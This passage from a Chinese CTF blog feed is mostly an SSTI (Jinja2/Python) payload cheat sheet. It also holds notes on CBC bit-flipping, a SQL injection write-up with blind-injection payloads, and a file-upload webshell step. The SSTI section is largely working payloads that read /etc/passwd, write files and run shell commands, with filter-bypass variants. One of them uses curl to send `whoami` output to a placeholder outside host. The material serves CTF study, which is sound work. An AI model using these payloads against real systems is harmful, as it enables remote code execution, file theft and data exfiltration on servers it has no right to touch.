是先用块加密器生成密钥流（Keystream），然后再将密钥流与明文流异或得到密文流，解密是先用块加密器生成密钥流，再将密钥流与密文流异或得到明文，由于异或操作的对称性所以加密和解密的流程是完全一样的</p><p>填充模式:<br>ZeroPadding，数据长度不对齐时使用0填充，否则不填充。<br>PKCS7Padding，假设数据长度需要填充n(n&gt;0)个字节才对齐，那么填充n个字节，每个字节都是n;如果数据本身就已经对齐了，则填充一块长度为块大小的数据，每个字节都是块大小。<br>PKCS5Padding，PKCS7Padding的子集，块大小固定为8字节。<br>由于使用PKCS7Padding&#x2F;PKCS5Padding填充时，最后一个字节肯定为填充数据的长度，所以在解密后可以准确删除填充的数据，而使用ZeroPadding填充时，没办法区分真实数据与填充数据，所以只适合以\0结尾的字符串加解密</p><h3 id="针对CBC的字节翻转攻击"><a href="#针对CBC的字节翻转攻击" class="headerlink" title="针对CBC的字节翻转攻击"></a>针对CBC的字节翻转攻击</h3><p><a href="https://blog.csdn.net/csu_vc/article/details/79619309">链接</a><br>理解了CBC加密的过程后，想想解密怎么搞，就是翻转攻击了:<br>CBC解密的过程<br>从密文中提取出IV，然后将密文分组。<br>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>重复2-3，直到最后一组密文。</p><p>前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。也就是通过改变上一组的密文，来改变本组的明文<br>这个文章讲得不错: <a href="https://www.jianshu.com/p/1001b4c2adeb">链接</a><br>具体: 比如要改变第二个块明文的某个字节，就把第一个密文的对应字节改了，然后，再把iv改了(所以iv是可以控制的吗….因为iv是随机生成的，而且我们可见，那自然是可以改变的…)</p><h2 id="sql注入-根据sql版本特性进行注入"><a href="#sql注入-根据sql版本特性进行注入" class="headerlink" title="sql注入-根据sql版本特性进行注入"></a>sql注入-根据sql版本特性进行注入</h2><p>主要问题出在闭合上，构造的的payload不知道为什么在环境里无法回显<br>进入页面查看源码，注释里给了查询语句，可以知道表名: select * from users where username&#x3D;’$username’ and password&#x3D;’$password’; </p><p>#、– 、–+、&#x2F;**&#x2F;都过滤了，无错误回显，sleep也过滤了，但是可以堆叠注入<br>当时想到的是利用’&#39;注释引号，然后进行布尔注入，但是，在构造好了payload并检查后，发现无论如何都不回显，就很疑惑<br>于是尝试自己搭sql环境试试，我寻思搭个sql环境肯定能找到好的教程吧…然后csdn里的教程不负众望的让我搭建失败了，然后就摆烂了….<br>自己构建的不知道为毛不回显的payload: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27; || username=admin;insert into users \&#x27;</span>; <br></code></pre></td></tr></table></figure><p>wp思路:<br>注释符可以用%00代替(我当时闭合时是用insert into 闭合的，不知道为什么出错了)<br>先盲注出版本8.0.26,搜到此版本新特性table可以用来注入(怎么搜的，这也太吊了? )</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=\<br><span class="hljs-attribute">password</span>=|| (<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)&lt;(table users);%00<br>获取sql版本: 8.0<br></code></pre></td></tr></table></figure><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">username=\<br>password= ||ascii(mid(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=num;%<span class="hljs-number">00</span><br>这个mid盲注没见过<span class="hljs-params">...</span>.<br>可以爆出username和password<span class="hljs-params">...</span>..(不对啊，我记得当时ascii明明被屏蔽了来着，于是还在想怎么用别的方式进行盲注<span class="hljs-params">...</span>.)<br></code></pre></td></tr></table></figure><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>token是简单的base64转码，转了是php序列化后的字符码，然后把里面的Tourist改成Lteam就行了<br>O:4”User”:1:{s:9:”usergroup”;s:7:”Tourist”;}</p><p>转了之后就是文件上传漏洞了，没有任何检查可以直接上传，然后蚁剑连就能看到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入姿势</title>
    <link href="/2022/04/26/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/04/26/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="payload作业"><a href="#payload作业" class="headerlink" title="payload作业"></a>payload作业</h1><p>有时候system函数会被过滤掉，我们就使用</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)  #读取本级目录<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">获得基类<br><span class="hljs-section">#python2.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><span class="hljs-section">#python3.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__。。。class__</span>.<span class="hljs-strong">__mro__</span>[1]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><span class="hljs-section">#python 2.7</span><br><span class="hljs-section">#文件操作</span><br><span class="hljs-section">#找到file类</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[40]<br><span class="hljs-section">#读文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()<br><span class="hljs-section">#写文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp&#x27;</span>).write(&#x27;test&#x27;)<br><br><span class="hljs-section">#命令执行</span><br><span class="hljs-section">#os执行</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.linecache下有os类，可以直接执行命令：</span><br><span class="hljs-emphasis">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func_</span>globals.linecache.os.popen(&#x27;id&#x27;).read()<br><span class="hljs-section">#eval,impoer等全局函数</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>下有eval，<span class="hljs-strong">__import__</span>等的全局函数，可以利用此来执行命令：<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__import__&#x27;</span>](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br><br><span class="hljs-section">#python3.7</span><br><span class="hljs-section">#命令执行</span><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#文件操作</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-section">#windows下的os命令</span><br>&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">118</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;dir&#x27;</span>).read()<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//获取基本类</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[1]</span><br>&#123;&#125;.__class__.__bases__<span class="hljs-selector-attr">[0]</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span><br><span class="hljs-selector-attr">[]</span>.__class__.__bases__<span class="hljs-selector-attr">[0]</span><br><span class="hljs-selector-tag">object</span><br><br><span class="hljs-comment">//读文件</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br><span class="hljs-comment">//写文件</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<span class="hljs-selector-class">.write</span>(<span class="hljs-string">&#x27;123&#x27;</span>)<br><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<span class="hljs-selector-class">.write</span>(<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><span class="hljs-comment">//执行任意命令</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[13]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br><span class="hljs-selector-tag">object</span>.__subclasses_ <span class="hljs-built_in">_</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[13]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>拼接: </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;linecache&#x27;</span>]</span>.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>]</span>.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>]</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;fla&#x27;</span>+<span class="hljs-string">&#x27;g.txt&#x27;</span>))<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>编码:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;ls&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)<br><br>等价于<br><br>()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;ZXZhbA==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)]</span>(&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(可以看出单双引号内的都可以编码)<br><br>同理还可以进行rot13、<span class="hljs-number">16</span>进制编码等<br></code></pre></td></tr></table></figure><p>过滤中括号: </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getitem</span><span class="hljs-params">()</span></span><br><br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span><br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>)<br><br><span class="hljs-function"><span class="hljs-title">pop</span><span class="hljs-params">()</span></span><br><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br>字典读取<br><br>__builtins__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>()<br>__builtins__<span class="hljs-selector-class">.eval</span>()<br><br>经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行<br><br></code></pre></td></tr></table></figure><p>过滤引号: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先获取chr函数，赋值给chr，后面拼接字符串</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% set</span><br><span class="language-xml">chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr</span><br><span class="language-xml">%&#125;</span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">chr</span>(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; ()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read() &#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml"></span><br><span class="language-xml">PS：将其中的request.args改为request.values则利用post的方式进行传参</span><br><span class="language-xml"></span><br><span class="language-xml">执行命令：</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% set</span><br><span class="language-xml">chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr</span><br><span class="language-xml">%&#125;</span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">chr</span>(<span class="hljs-name">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">request.args.cmd</span>).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml">&amp;cmd=id</span><br></code></pre></td></tr></table></figure><p>过滤双下划线: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable"><span class="hljs-name">&#x27;&#x27;</span>[request.args.class][request.args.mro][2][request.args.subclasses]()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></code></pre></td></tr></table></figure><p>过滤{undefined{undefined</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">1</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>在url执行py格式命令: </p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">eg:</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;file&#x27; %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="buuctf-Flask-SSTI-1次实战"><a href="#buuctf-Flask-SSTI-1次实战" class="headerlink" title="buuctf [Flask ]SSTI (1次实战)"></a>buuctf [Flask ]SSTI (1次实战)</h1><p>进入页面，啥也没有，f12注释，也没有，那能想到的就是dirsearch扫了<br>嗯…啥也没扫出来，看看robots.txt，也没有…..</p><p>嗯，8会，看wp</p><p>get传参: name&#x3D;4或者{undefined{2*2}}——–(至于为什么是name我也没找到答案)<br>回显是4，说明有ssti漏洞</p><p>构造payload，核心代码: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;type flag.txt&#x27;).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p><p>参考链接:<br><img src="https://www.cnblogs.com/Article-kelp/p/14797393.html" alt="链接"></p><h1 id="脚本找出合适的类"><a href="#脚本找出合适的类" class="headerlink" title="脚本找出合适的类"></a>脚本找出合适的类</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 仅供参考，不是用来抄作业的</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">400</span>):<br>    url=<span class="hljs-string">&quot;http://61ef7259-23f5-43b3-8a0d-111f2e8a2c17.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span><br>    response=res.get(url%i)<br>    <span class="hljs-comment">#BUUCTF中访问速度过快会返回429，此时就需要暂缓再访问</span><br>    <span class="hljs-keyword">if</span> response.status_code!=<span class="hljs-number">200</span>:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        response=res.get(url%i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(response.text),i,response.status_code)<br>    <br></code></pre></td></tr></table></figure><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 